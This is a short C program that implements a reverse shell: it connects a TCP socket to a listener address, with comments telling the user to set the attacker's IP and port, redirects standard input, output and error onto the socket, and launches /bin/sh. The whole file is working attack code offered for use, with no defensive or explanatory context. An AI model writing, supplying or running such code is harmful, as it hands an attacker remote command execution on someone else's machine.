#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(void) {
    int sockfd;
    struct sockaddr_in target;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    target.sin_family = AF_INET;
    target.sin_port = htons(1234); //change this to the desired port
    target.sin_addr.s_addr = inet_addr("127.0.0.1"); //change this to the IP of the listener

    connect(sockfd, (struct sockaddr *)&target, sizeof(target));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
